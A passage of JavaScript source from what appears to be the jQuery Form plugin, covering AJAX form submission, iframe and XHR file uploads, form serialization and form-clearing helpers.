          type: method || $.ajaxSettings.type,
          iframeSrc: /^https/i.test(window.location.href || '') ? 'javascript:false' : 'about:blank'
      }, options);

      // hook for manipulating the form data before it is extracted;
      // convenient for use with rich editors like tinyMCE or FCKEditor
      var veto = {};
      this.trigger('form-pre-serialize', [this, options, veto]);
      if (veto.veto) {
          log('ajaxSubmit: submit vetoed via form-pre-serialize trigger');
          return this;
      }

      // provide opportunity to alter form data before it is serialized
      if (options.beforeSerialize && options.beforeSerialize(this, options) === false) {
          log('ajaxSubmit: submit aborted via beforeSerialize callback');
          return this;
      }

      var traditional = options.traditional;
      if ( traditional === undefined ) {
          traditional = $.ajaxSettings.traditional;
      }

      var elements = [];
      var qx, a = this.formToArray(options.semantic, elements);
      if (options.data) {
          options.extraData = options.data;
          qx = $.param(options.data, traditional);
      }

      // give pre-submit callback an opportunity to abort the submit
      if (options.beforeSubmit && options.beforeSubmit(a, this, options) === false) {
          log('ajaxSubmit: submit aborted via beforeSubmit callback');
          return this;
      }

      // fire vetoable 'validate' event
      this.trigger('form-submit-validate', [a, this, options, veto]);
      if (veto.veto) {
          log('ajaxSubmit: submit vetoed via form-submit-validate trigger');
          return this;
      }

      var q = $.param(a, traditional);
      if (qx) {
          q = ( q ? (q + '&' + qx) : qx );
      }
      if (options.type.toUpperCase() == 'GET') {
          options.url += (options.url.indexOf('?') >= 0 ? '&' : '?') + q;
          options.data = null;  // data is null for 'get'
      }
      else {
          options.data = q; // data is the query string for 'post'
      }

      var callbacks = [];
      if (options.resetForm) {
          callbacks.push(function() { $form.resetForm(); });
      }
      if (options.clearForm) {
          callbacks.push(function() { $form.clearForm(options.includeHidden); });
      }

      // perform a load on the target only if dataType is not provided
      if (!options.dataType && options.target) {
          var oldSuccess = options.success || function(){};
          callbacks.push(function(data) {
              var fn = options.replaceTarget ? 'replaceWith' : 'html';
              $(options.target)[fn](data).each(oldSuccess, arguments);
          });
      }
      else if (options.success) {
          callbacks.push(options.success);
      }

      options.success = function(data, status, xhr) { // jQuery 1.4+ passes xhr as 3rd arg
          var context = options.context || this ;    // jQuery 1.4+ supports scope context
          for (var i=0, max=callbacks.length; i < max; i++) {
              callbacks[i].apply(context, [data, status, xhr || $form, $form]);
          }
      };

      if (options.error) {
          var oldError = options.error;
          options.error = function(xhr, status, error) {
              var context = options.context || this;
              oldError.apply(context, [xhr, status, error, $form]);
          };
      }

       if (options.complete) {
          var oldComplete = options.complete;
          options.complete = function(xhr, status) {
              var context = options.context || this;
              oldComplete.apply(context, [xhr, status, $form]);
          };
      }

      // are there files to upload?

      // [value] (issue #113), also see comment:
      // https://github.com/malsup/form/commit/588306aedba1de01388032d5f42a60159eea9228#commitcomment-2180219
      var fileInputs = $('input[type=file]:enabled', this).filter(function() { return $(this).val() !== ''; });

      var hasFileInputs = fileInputs.length > 0;
      var mp = 'multipart/form-data';
      var multipart = ($form.attr('enctype') == mp || $form.attr('encoding') == mp);

      var fileAPI = feature.fileapi && feature.formdata;
      log("fileAPI :" + fileAPI);
      var shouldUseFrame = (hasFileInputs || multipart) && !fileAPI;

      var jqxhr;

      // options.iframe allows user to force iframe mode
      // 06-NOV-09: now defaulting to iframe mode if file input is detected
      if (options.iframe !== false && (options.iframe || shouldUseFrame)) {
          // hack to fix Safari hang (thanks to Tim Molendijk for this)
          // see:  http://groups.google.com/group/jquery-dev/browse_thread/thread/36395b7ab510dd5d
          if (options.closeKeepAlive) {
              $.get(options.closeKeepAlive, function() {
                  jqxhr = fileUploadIframe(a);
              });
          }
          else {
              jqxhr = fileUploadIframe(a);
          }
      }
      else if ((hasFileInputs || multipart) && fileAPI) {
          jqxhr = fileUploadXhr(a);
      }
      else {
          jqxhr = $.ajax(options);
      }

      $form.removeData('jqxhr').data('jqxhr', jqxhr);

      // clear element array
      for (var k=0; k < elements.length; k++) {
          elements[k] = null;
      }

      // fire 'notify' event
      this.trigger('form-submit-notify', [this, options]);
      return this;

      // utility fn for deep serialization
      function deepSerialize(extraData){
          var serialized = $.param(extraData, options.traditional).split('&');
          var len = serialized.length;
          var result = [];
          var i, part;
          for (i=0; i < len; i++) {
              // #252; undo param space replacement
              serialized[i] = serialized[i].replace(/\+/g,' ');
              part = serialized[i].split('=');
              // #278; use array instead of object storage, favoring array serializations
              result.push([decodeURIComponent(part[0]), decodeURIComponent(part[1])]);
          }
          return result;
      }

       // XMLHttpRequest Level 2 file uploads (big hat tip to francois2metz)
      function fileUploadXhr(a) {
          var formdata = new FormData();

          for (var i=0; i < a.length; i++) {
              formdata.append(a[i].name, a[i].value);
          }

          if (options.extraData) {
              var serializedData = deepSerialize(options.extraData);
              for (i=0; i < serializedData.length; i++) {
                  if (serializedData[i]) {
                      formdata.append(serializedData[i][0], serializedData[i][1]);
                  }
              }
          }

          options.data = null;

          var s = $.extend(true, {}, $.ajaxSettings, options, {
              contentType: false,
              processData: false,
              cache: false,
              type: method || 'POST'
          });

          if (options.uploadProgress) {
              // workaround because jqXHR does not expose upload property
              s.xhr = function() {
                  var xhr = $.ajaxSettings.xhr();
                  if (xhr.upload) {
                      xhr.upload.addEventListener('progress', function(event) {
                          var percent = 0;
                          var position = event.loaded || event.position; /*event.position is deprecated*/
                          var total = event.total;
                          if (event.lengthComputable) {
                              percent = Math.ceil(position / total * 100);
                          }
                          options.uploadProgress(event, position, total, percent);
                      }, false);
                  }
                  return xhr;
              };
          }

          s.data = null;
          var beforeSend = s.beforeSend;
          s.beforeSend = function(xhr, o) {
              //Send FormData() provided by user
              if (options.formData) {
                  o.data = options.formData;
              }
              else {
                  o.data = formdata;
              }
              if(beforeSend) {
                  beforeSend.call(this, xhr, o);
              }
          };
          return $.ajax(s);
      }

      // private function for handling file uploads (hat tip to YAHOO!)
      function fileUploadIframe(a) {
          var form = $form[0], el, i, s, g, id, $io, io, xhr, sub, n, timedOut, timeoutHandle;
          var deferred = $.Deferred();

          // #341
          deferred.abort = function(status) {
              xhr.abort(status);
          };

          if (a) {
              // ensure that every serialized input is still enabled
              for (i=0; i < elements.length; i++) {
                  el = $(elements[i]);
                  if ( hasProp ) {
                      el.prop('disabled', false);
                  }
                  else {
                      el.removeAttr('disabled');
                  }
              }
          }

          s = $.extend(true, {}, $.ajaxSettings, options);
          s.context = s.context || s;
          id = 'jqFormIO' + (new Date().getTime());
          if (s.iframeTarget) {
              $io = $(s.iframeTarget);
              n = $io.attr2('name');
              if (!n) {
                  $io.attr2('name', id);
              }
              else {
                  id = n;
              }
          }
          else {
              $io = $('<iframe name="' + id + '" src="'+ s.iframeSrc +'" />');
              $io.css({ position: 'absolute', top: '-1000px', left: '-1000px' });
          }
          io = $io[0];


          xhr = { // mock object
              aborted: 0,
              responseText: null,
              responseXML: null,
              status: 0,
              statusText: 'n/a',
              getAllResponseHeaders: function() {},
              getResponseHeader: function() {},
              setRequestHeader: function() {},
              abort: function(status) {
                  var e = (status === 'timeout' ? 'timeout' : 'aborted');
                  log('aborting upload... ' + e);
                  this.aborted = 1;

                  try { // #214, #257
                      if (io.contentWindow.document.execCommand) {
                          io.contentWindow.document.execCommand('Stop');
                      }
                  }
                  catch(ignore) {}

                  $io.attr('src', s.iframeSrc); // abort op in progress
                  xhr.error = e;
                  if (s.error) {
                      s.error.call(s.context, xhr, e, status);
                  }
                  if (g) {
                      $.event.trigger("ajaxError", [xhr, s, e]);
                  }
                  if (s.complete) {
                      s.complete.call(s.context, xhr, e);
                  }
              }
          };

          g = s.global;
          // trigger ajax global events so that activity/block indicators work like normal
          if (g && 0 === $.active++) {
              $.event.trigger("ajaxStart");
          }
          if (g) {
              $.event.trigger("ajaxSend", [xhr, s]);
          }

          if (s.beforeSend && s.beforeSend.call(s.context, xhr, s) === false) {
              if (s.global) {
                  $.active--;
              }
              deferred.reject();
              return deferred;
          }
          if (xhr.aborted) {
              deferred.reject();
              return deferred;
          }

          // add submitting element to data if we know it
          sub = form.clk;
          if (sub) {
              n = sub.name;
              if (n && !sub.disabled) {
                  s.extraData = s.extraData || {};
                  s.extraData[n] = sub.value;
                  if (sub.type == "image") {
                      s.extraData[n+'.x'] = form.clk_x;
                      s.extraData[n+'.y'] = form.clk_y;
                  }
              }
          }

          var CLIENT_TIMEOUT_ABORT = 1;
          var SERVER_ABORT = 2;

          function getDoc(frame) {
              /* it looks like contentWindow or contentDocument do not
               * carry the protocol property in ie8, when running under ssl
               * frame.document is the only valid response document, since
               * the protocol is know but not on the other two objects. strange?
               * "Same origin policy" http://en.wikipedia.org/wiki/Same_origin_policy
               */

              var doc = null;

              // IE8 cascading access check
              try {
                  if (frame.contentWindow) {
                      doc = frame.contentWindow.document;
                  }
              } catch(err) {
                  // IE8 access denied under ssl & missing protocol
                  log('cannot get iframe.contentWindow document: ' + err);
              }

              if (doc) { // successful getting content
                  return doc;
              }

              try { // simply checking may throw in ie8 under ssl or mismatched protocol
                  doc = frame.contentDocument ? frame.contentDocument : frame.document;
              } catch(err) {
                  // last attempt
                  log('cannot get iframe.contentDocument: ' + err);
                  doc = frame.document;
              }
              return doc;
          }

          // Rails CSRF hack (thanks to Yvan Barthelemy)
          var csrf_token = $('meta[name=csrf-token]').attr('content');
          var csrf_param = $('meta[name=csrf-param]').attr('content');
          if (csrf_param && csrf_token) {
              s.extraData = s.extraData || {};
              s.extraData[csrf_param] = csrf_token;
          }

          // take a breath so that pending repaints get some cpu time before the upload starts
          function doSubmit() {
              // make sure form attrs are set
              var t = $form.attr2('target'),
                  a = $form.attr2('action'),
                  mp = 'multipart/form-data',
                  et = $form.attr('enctype') || $form.attr('encoding') || mp;

              // update form attrs in IE friendly way
              form.setAttribute('target',id);
              if (!method || /post/i.test(method) ) {
                  form.setAttribute('method', 'POST');
              }
              if (a != s.url) {
                  form.setAttribute('action', s.url);
              }

              // ie borks in some cases when setting encoding
              if (! s.skipEncodingOverride && (!method || /post/i.test(method))) {
                  $form.attr({
                      encoding: 'multipart/form-data',
                      enctype:  'multipart/form-data'
                  });
              }

              // support timout
              if (s.timeout) {
                  timeoutHandle = setTimeout(function() { timedOut = true; cb(CLIENT_TIMEOUT_ABORT); }, s.timeout);
              }

              // look for server aborts
              function checkState() {
                  try {
                      var state = getDoc(io).readyState;
                      log('state = ' + state);
                      if (state && state.toLowerCase() == 'uninitialized') {
                          setTimeout(checkState,50);
                      }
                  }
                  catch(e) {
                      log('Server abort: ' , e, ' (', e.name, ')');
                      cb(SERVER_ABORT);
                      if (timeoutHandle) {
                          clearTimeout(timeoutHandle);
                      }
                      timeoutHandle = undefined;
                  }
              }

              // add "extra" data to form if provided in options
              var extraInputs = [];
              try {
                  if (s.extraData) {
                      for (var n in s.extraData) {
                          if (s.extraData.hasOwnProperty(n)) {
                             // if using the $.param format that allows for multiple values with the same name
                             if($.isPlainObject(s.extraData[n]) && s.extraData[n].hasOwnProperty('name') && s.extraData[n].hasOwnProperty('value')) {
                                 extraInputs.push(
                                 $('<input type="hidden" name="'+s.extraData[n].name+'">').val(s.extraData[n].value)
                                     .appendTo(form)[0]);
                             } else {
                                 extraInputs.push(
                                 $('<input type="hidden" name="'+n+'">').val(s.extraData[n])
                                     .appendTo(form)[0]);
                             }
                          }
                      }
                  }

                  if (!s.iframeTarget) {
                      // add iframe to doc and submit the form
                      $io.appendTo('body');
                  }
                  if (io.attachEvent) {
                      io.attachEvent('onload', cb);
                  }
                  else {
                      io.addEventListener('load', cb, false);
                  }
                  setTimeout(checkState,15);

                  try {
                      form.submit();
                  } catch(err) {
                      // just in case form has element with name/id of 'submit'
                      var submitFn = document.createElement('form').submit;
                      submitFn.apply(form);
                  }
              }
              finally {
                  // reset attrs and remove "extra" input elements
                  form.setAttribute('action',a);
                  form.setAttribute('enctype', et); // #380
                  if(t) {
                      form.setAttribute('target', t);
                  } else {
                      $form.removeAttr('target');
                  }
                  $(extraInputs).remove();
              }
          }

          if (s.forceSync) {
              doSubmit();
          }
          else {
              setTimeout(doSubmit, 10); // this lets dom updates render
          }

          var data, doc, domCheckCount = 50, callbackProcessed;

          function cb(e) {
              if (xhr.aborted || callbackProcessed) {
                  return;
              }

              doc = getDoc(io);
              if(!doc) {
                  log('cannot access response document');
                  e = SERVER_ABORT;
              }
              if (e === CLIENT_TIMEOUT_ABORT && xhr) {
                  xhr.abort('timeout');
                  deferred.reject(xhr, 'timeout');
                  return;
              }
              else if (e == SERVER_ABORT && xhr) {
                  xhr.abort('server abort');
                  deferred.reject(xhr, 'error', 'server abort');
                  return;
              }

              if (!doc || doc.location.href == s.iframeSrc) {
                  // response not received yet
                  if (!timedOut) {
                      return;
                  }
              }
              if (io.detachEvent) {
                  io.detachEvent('onload', cb);
              }
              else {
                  io.removeEventListener('load', cb, false);
              }

              var status = 'success', errMsg;
              try {
                  if (timedOut) {
                      throw 'timeout';
                  }

                  var isXml = s.dataType == 'xml' || doc.XMLDocument || $.isXMLDoc(doc);
                  log('isXml='+isXml);
                  if (!isXml && window.opera && (doc.body === null || !doc.body.innerHTML)) {
                      if (--domCheckCount) {
                          // in some browsers (Opera) the iframe DOM is not always traversable when
                          // the onload callback fires, so we loop a bit to accommodate
                          log('requeing onLoad callback, DOM not available');
                          setTimeout(cb, 250);
                          return;
                      }
                      // let this fall through because server response could be an empty document
                      //log('Could not access iframe DOM after mutiple tries.');
                      //throw 'DOMException: not available';
                  }

                  //log('response detected');
                  var docRoot = doc.body ? doc.body : doc.documentElement;
                  xhr.responseText = docRoot ? docRoot.innerHTML : null;
                  xhr.responseXML = doc.XMLDocument ? doc.XMLDocument : doc;
                  if (isXml) {
                      s.dataType = 'xml';
                  }
                  xhr.getResponseHeader = function(header){
                      var headers = {'content-type': s.dataType};
                      return headers[header.toLowerCase()];
                  };
                  // support for XHR 'status' & 'statusText' emulation :
                  if (docRoot) {
                      xhr.status = Number( docRoot.getAttribute('status') ) || xhr.status;
                      xhr.statusText = docRoot.getAttribute('statusText') || xhr.statusText;
                  }

                  var dt = (s.dataType || '').toLowerCase();
                  var scr = /(json|script|text)/.test(dt);
                  if (scr || s.textarea) {
                      // see if user embedded response in textarea
                      var ta = doc.getElementsByTagName('textarea')[0];
                      if (ta) {
                          xhr.responseText = ta.value;
                          // support for XHR 'status' & 'statusText' emulation :
                          xhr.status = Number( ta.getAttribute('status') ) || xhr.status;
                          xhr.statusText = ta.getAttribute('statusText') || xhr.statusText;
                      }
                      else if (scr) {
                          // account for browsers injecting pre around json response
                          var pre = doc.getElementsByTagName('pre')[0];
                          var b = doc.getElementsByTagName('body')[0];
                          if (pre) {
                              xhr.responseText = pre.textContent ? pre.textContent : pre.innerText;
                          }
                          else if (b) {
                              xhr.responseText = b.textContent ? b.textContent : b.innerText;
                          }
                      }
                  }
                  else if (dt == 'xml' && !xhr.responseXML && xhr.responseText) {
                      xhr.responseXML = toXml(xhr.responseText);
                  }

                  try {
                      data = httpData(xhr, dt, s);
                  }
                  catch (err) {
                      status = 'parsererror';
                      xhr.error = errMsg = (err || status);
                  }
              }
              catch (err) {
                  log('error caught: ',err);
                  status = 'error';
                  xhr.error = errMsg = (err || status);
              }

              if (xhr.aborted) {
                  log('upload aborted');
                  status = null;
              }

              if (xhr.status) { // we've set xhr.status
                  status = (xhr.status >= 200 && xhr.status < 300 || xhr.status === 304) ? 'success' : 'error';
              }

              // ordering of these callbacks/triggers is odd, but that's how $.ajax does it
              if (status === 'success') {
                  if (s.success) {
                      s.success.call(s.context, data, 'success', xhr);
                  }
                  deferred.resolve(xhr.responseText, 'success', xhr);
                  if (g) {
                      $.event.trigger("ajaxSuccess", [xhr, s]);
                  }
              }
              else if (status) {
                  if (errMsg === undefined) {
                      errMsg = xhr.statusText;
                  }
                  if (s.error) {
                      s.error.call(s.context, xhr, status, errMsg);
                  }
                  deferred.reject(xhr, 'error', errMsg);
                  if (g) {
                      $.event.trigger("ajaxError", [xhr, s, errMsg]);
                  }
              }

              if (g) {
                  $.event.trigger("ajaxComplete", [xhr, s]);
              }

              if (g && ! --$.active) {
                  $.event.trigger("ajaxStop");
              }

              if (s.complete) {
                  s.complete.call(s.context, xhr, status);
              }

              callbackProcessed = true;
              if (s.timeout) {
                  clearTimeout(timeoutHandle);
              }

              // clean up
              setTimeout(function() {
                  if (!s.iframeTarget) {
                      $io.remove();
                  }
                  else { //adding else to clean up existing iframe response.
                      $io.attr('src', s.iframeSrc);
                  }
                  xhr.responseXML = null;
              }, 100);
          }

          var toXml = $.parseXML || function(s, doc) { // use parseXML if available (jQuery 1.5+)
              if (window.ActiveXObject) {
                  doc = new ActiveXObject('Microsoft.XMLDOM');
                  doc.async = 'false';
                  doc.loadXML(s);
              }
              else {
                  doc = (new DOMParser()).parseFromString(s, 'text/xml');
              }
              return (doc && doc.documentElement && doc.documentElement.nodeName != 'parsererror') ? doc : null;
          };
          var parseJSON = $.parseJSON || function(s) {
              /*jslint evil:true */
              return window['eval']('(' + s + ')');
          };

          var httpData = function( xhr, type, s ) { // mostly lifted from jq1.4.4

              var ct = xhr.getResponseHeader('content-type') || '',
                  xml = type === 'xml' || !type && ct.indexOf('xml') >= 0,
                  data = xml ? xhr.responseXML : xhr.responseText;

              if (xml && data.documentElement.nodeName === 'parsererror') {
                  if ($.error) {
                      $.error('parsererror');
                  }
              }
              if (s && s.dataFilter) {
                  data = s.dataFilter(data, type);
              }
              if (typeof data === 'string') {
                  if (type === 'json' || !type && ct.indexOf('json') >= 0) {
                      data = parseJSON(data);
                  } else if (type === "script" || !type && ct.indexOf("javascript") >= 0) {
                      $.globalEval(data);
                  }
              }
              return data;
          };

          return deferred;
      }
  };

  /**
   * ajaxForm() provides a mechanism for fully automating form submission.
   *
   * The advantages of using this method instead of ajaxSubmit() are:
   *
   * 1: This method will include coordinates for <input type="image" /> elements (if the element
   *    is used to submit the form).
   * 2. This method will include the submit element's name/value data (for the element that was
   *    used to submit the form).
   * 3. This method binds the submit() method to the form for you.
   *
   * The options argument for ajaxForm works exactly as it does for ajaxSubmit.  ajaxForm merely
   * passes the options argument along after properly binding events for submit elements and
   * the form itself.
   */
  $.fn.ajaxForm = function(options) {
      options = options || {};
      options.delegation = options.delegation && $.isFunction($.fn.on);

      // in jQuery 1.3+ we can fix mistakes with the ready state
      if (!options.delegation && this.length === 0) {
          var o = { s: this.selector, c: this.context };
          if (!$.isReady && o.s) {
              log('DOM not ready, queuing ajaxForm');
              $(function() {
                  $(o.s,o.c).ajaxForm(options);
              });
              return this;
          }
          // is your DOM ready?  http://docs.jquery.com/Tutorials:Introducing_$(document).ready()
          log('terminating; zero elements found by selector' + ($.isReady ? '' : ' (DOM not ready)'));
          return this;
      }

      if ( options.delegation ) {
          $(document)
              .off('submit.form-plugin', this.selector, doAjaxSubmit)
              .off('click.form-plugin', this.selector, captureSubmittingElement)
              .on('submit.form-plugin', this.selector, options, doAjaxSubmit)
              .on('click.form-plugin', this.selector, options, captureSubmittingElement);
          return this;
      }

      return this.ajaxFormUnbind()
          .bind('submit.form-plugin', options, doAjaxSubmit)
          .bind('click.form-plugin', options, captureSubmittingElement);
  };

  // private event handlers
  function doAjaxSubmit(e) {
      /*jshint validthis:true */
      var options = e.data;
      if (!e.isDefaultPrevented()) { // if event has been canceled, don't proceed
          e.preventDefault();
          $(e.target).ajaxSubmit(options); // #365
      }
  }

  function captureSubmittingElement(e) {
      /*jshint validthis:true */
      var target = e.target;
      var $el = $(target);
      if (!($el.is("[type=submit],[type=image]"))) {
          // is this a child element of the submit el?  (ex: a span within a button)
          var t = $el.closest('[type=submit]');
          if (t.length === 0) {
              return;
          }
          target = t[0];
      }
      var form = this;
      form.clk = target;
      if (target.type == 'image') {
          if (e.offsetX !== undefined) {
              form.clk_x = e.offsetX;
              form.clk_y = e.offsetY;
          } else if (typeof $.fn.offset == 'function') {
              var offset = $el.offset();
              form.clk_x = e.pageX - offset.left;
              form.clk_y = e.pageY - offset.top;
          } else {
              form.clk_x = e.pageX - target.offsetLeft;
              form.clk_y = e.pageY - target.offsetTop;
          }
      }
      // clear form vars
      setTimeout(function() { form.clk = form.clk_x = form.clk_y = null; }, 100);
  }


  // ajaxFormUnbind unbinds the event handlers that were bound by ajaxForm
  $.fn.ajaxFormUnbind = function() {
      return this.unbind('submit.form-plugin click.form-plugin');
  };

  /**
   * formToArray() gathers form element data into an array of objects that can
   * be passed to any of the following ajax functions: $.get, $.post, or load.
   * Each object in the array has both a 'name' and 'value' property.  An example of
   * an array for a simple login form might be:
   *
   * [ { name: 'username', value: 'jresig' }, { name: 'password', value: 'secret' } ]
   *
   * It is this array that is passed to pre-submit callback functions provided to the
   * ajaxSubmit() and ajaxForm() methods.
   */
  $.fn.formToArray = function(semantic, elements) {
      var a = [];
      if (this.length === 0) {
          return a;
      }

      var form = this[0];
      var formId = this.attr('id');
      var els = semantic ? form.getElementsByTagName('*') : form.elements;
      var els2;

      if (els && !/MSIE [678]/.test(navigator.userAgent)) { // #390
          els = $(els).get();  // convert to standard array
      }

      // #386; account for inputs outside the form which use the 'form' attribute
      if ( formId ) {
          els2 = $(':input[form="' + formId + '"]').get(); // hat tip @thet
          if ( els2.length ) {
              els = (els || []).concat(els2);
          }
      }

      if (!els || !els.length) {
          return a;
      }

      var i,j,n,v,el,max,jmax;
      for(i=0, max=els.length; i < max; i++) {
          el = els[i];
          n = el.name;
          if (!n || el.disabled) {
              continue;
          }

          if (semantic && form.clk && el.type == "image") {
              // handle image inputs on the fly when semantic == true
              if(form.clk == el) {
                  a.push({name: n, value: $(el).val(), type: el.type });
                  a.push({name: n+'.x', value: form.clk_x}, {name: n+'.y', value: form.clk_y});
              }
              continue;
          }

          v = $.fieldValue(el, true);
          if (v && v.constructor == Array) {
              if (elements) {
                  elements.push(el);
              }
              for(j=0, jmax=v.length; j < jmax; j++) {
                  a.push({name: n, value: v[j]});
              }
          }
          else if (feature.fileapi && el.type == 'file') {
              if (elements) {
                  elements.push(el);
              }
              var files = el.files;
              if (files.length) {
                  for (j=0; j < files.length; j++) {
                      a.push({name: n, value: files[j], type: el.type});
                  }
              }
              else {
                  // #180
                  a.push({ name: n, value: '', type: el.type });
              }
          }
          else if (v !== null && typeof v != 'undefined') {
              if (elements) {
                  elements.push(el);
              }
              a.push({name: n, value: v, type: el.type, required: el.required});
          }
      }

      if (!semantic && form.clk) {
          // input type=='image' are not found in elements array! handle it here
          var $input = $(form.clk), input = $input[0];
          n = input.name;
          if (n && !input.disabled && input.type == 'image') {
              a.push({name: n, value: $input.val()});
              a.push({name: n+'.x', value: form.clk_x}, {name: n+'.y', value: form.clk_y});
          }
      }
      return a;
  };

  /**
   * Serializes form data into a 'submittable' string. This method will return a string
   * in the format: name1=value1&amp;name2=value2
   */
  $.fn.formSerialize = function(semantic) {
      //hand off to jQuery.param for proper encoding
      return $.param(this.formToArray(semantic));
  };

  /**
   * Serializes all field elements in the jQuery object into a query string.
   * This method will return a string in the format: name1=value1&amp;name2=value2
   */
  $.fn.fieldSerialize = function(successful) {
      var a = [];
      this.each(function() {
          var n = this.name;
          if (!n) {
              return;
          }
          var v = $.fieldValue(this, successful);
          if (v && v.constructor == Array) {
              for (var i=0,max=v.length; i < max; i++) {
                  a.push({name: n, value: v[i]});
              }
          }
          else if (v !== null && typeof v != 'undefined') {
              a.push({name: this.name, value: v});
          }
      });
      //hand off to jQuery.param for proper encoding
      return $.param(a);
  };

  /**
   * Returns the value(s) of the element in the matched set.  For example, consider the following form:
   *
   *  <form><fieldset>
   *      <input name="A" type="text" />
   *      <input name="A" type="text" />
   *      <input name="B" type="checkbox" value="B1" />
   *      <input name="B" type="checkbox" value="B2"/>
   *      <input name="C" type="radio" value="C1" />
   *      <input name="C" type="radio" value="C2" />
   *  </fieldset></form>
   *
   *  var v = $('input[type=text]').fieldValue();
   *  // if no values are entered into the text inputs
   *  v == ['','']
   *  // if values entered into the text inputs are 'foo' and 'bar'
   *  v == ['foo','bar']
   *
   *  var v = $('input[type=checkbox]').fieldValue();
   *  // if neither checkbox is checked
   *  v === undefined
   *  // if both checkboxes are checked
   *  v == ['B1', 'B2']
   *
   *  var v = $('input[type=radio]').fieldValue();
   *  // if neither radio is checked
   *  v === undefined
   *  // if first radio is checked
   *  v == ['C1']
   *
   * The successful argument controls whether or not the field element must be 'successful'
   * (per http://www.w3.org/TR/html4/interact/forms.html#successful-controls).
   * The default value of the successful argument is true.  If this value is false the value(s)
   * for each element is returned.
   *
   * Note: This method *always* returns an array.  If no valid value can be determined the
   *    array will be empty, otherwise it will contain one or more values.
   */
  $.fn.fieldValue = function(successful) {
      for (var val=[], i=0, max=this.length; i < max; i++) {
          var el = this[i];
          var v = $.fieldValue(el, successful);
          if (v === null || typeof v == 'undefined' || (v.constructor == Array && !v.length)) {
              continue;
          }
          if (v.constructor == Array) {
              $.merge(val, v);
          }
          else {
              val.push(v);
          }
      }
      return val;
  };

  /**
   * Returns the value of the field element.
   */
  $.fieldValue = function(el, successful) {
      var n = el.name, t = el.type, tag = el.tagName.toLowerCase();
      if (successful === undefined) {
          successful = true;
      }

      if (successful && (!n || el.disabled || t == 'reset' || t == 'button' ||
          (t == 'checkbox' || t == 'radio') && !el.checked ||
          (t == 'submit' || t == 'image') && el.form && el.form.clk != el ||
          tag == 'select' && el.selectedIndex == -1)) {
              return null;
      }

      if (tag == 'select') {
          var index = el.selectedIndex;
          if (index < 0) {
              return null;
          }
          var a = [], ops = el.options;
          var one = (t == 'select-one');
          var max = (one ? index+1 : ops.length);
          for(var i=(one ? index : 0); i < max; i++) {
              var op = ops[i];
              if (op.selected) {
                  var v = op.value;
                  if (!v) { // extra pain for IE...
                      v = (op.attributes && op.attributes.value && !(op.attributes.value.specified)) ? op.text : op.value;
                  }
                  if (one) {
                      return v;
                  }
                  a.push(v);
              }
          }
          return a;
      }
      return $(el).val();
  };

  /**
   * Clears the form data.  Takes the following actions on the form's input fields:
   *  - input text fields will have their 'value' property set to the empty string
   *  - select elements will have their 'selectedIndex' property set to -1
   *  - checkbox and radio inputs will have their 'checked' property set to false
   *  - inputs of type submit, button, reset, and hidden will *not* be effected
   *  - button elements will *not* be effected
   */
  $.fn.clearForm = function(includeHidden) {
      return this.each(function() {
          $('input,select,textarea', this).clearFields(includeHidden);
      });
  };

  /**
   * Clears the selected form elements.
   */
  $.fn.clearFields = $.fn.clearInputs = function(includeHidden) {
      var re = /^(?:color|date|datetime|email|month|number|password|range|search|tel|text|time|url|week)$/i; // 'hidden' is not in this list
      return this.each(function() {
          var t = this.type, tag = this.tagName.toLowerCase();
          if (re.test(t) || tag == 'textarea') {
              this.value = '';
          }
          else if (t == 'checkbox' || t == 'radio') {
              this.checked = false;
          }
          else if (tag == 'select') {
              this.selectedIndex = -1;
          }
          else if (t == "file") {
              if (/MSIE/.test(navigator.userAgent)) {
                  $(this).replaceWith($(this).clone(true));
              } else {
                  $(this).val('');
              }
          }
          else if (includeHidden) {
              // includeHidden can be the value true, or it can be a selector string
              // indicating a special test; for example:
              //  $('#myForm').clearForm('.special:hidden')
              // the above would clean hidden inputs that have the class of 'special'
              if ( (includeHidden === true && /hidden/.test(t)) ||
                   (typeof includeHidden == 'string' && $(this).is(includeHidden)) ) {
                  this.value = '';
              }
          }
      });
  };

  /**
   * Resets the form data.  Causes all form elements to be reset to their original value.
   */
  $.fn.resetForm = function() {
      return this.each(function() {
          // guard against an input with the name of 'reset'
          // note that IE reports the reset function as an 'object'
          if (typeof this.reset == 'function' || (typeof this.reset == 'object' && !this.reset.nodeType)) {
              this.reset();
          }
      });
  };

  /**
   * Enables or disables any matching elements.
   */
  $.fn.enable = function(b) {
      if (b === undefined) {
          b = true;
      }
      return this.each(function() {
          this.disabled = !b;
      });
  };

  /**
   * Checks/unchecks any matching checkboxes or radio buttons and
   * selects/deselects and matching option elements.
   */
  $.fn.selected = function(select) {
      if (select === undefined) {
          select = true;
      }
      return this.each(function() {
          var t = this.type;
          if (t == 'checkbox' || t == 'radio') {
              this.checked = select;
          }
          else if (this.tagName.toLowerCase() == 'option') {
              var $sel = $(this).parent('select');
              if (select && $sel[0] && $sel[0].type == 'select-one') {
                  // deselect all other options
                  $sel.find('option').selected(false);
              }
              this.selected = select;
          }
      });
  };

  // expose debug var
  $.fn.ajaxSubmit.debug = false;

  // helper fn for console logging
  function log() {
      if (!$.fn.ajaxSubmit.debug) {
          return;
      }
      var msg = '[jquery.form] ' + Array.prototype.join.call(arguments,'');
      if (window.console && window.console.log) {
          window.console.log(msg);
      }
      else if (window.opera && window.opera.postError) {
          window.opera.postError(msg);
      }
  }

  }));

  //______________________________________________________________________
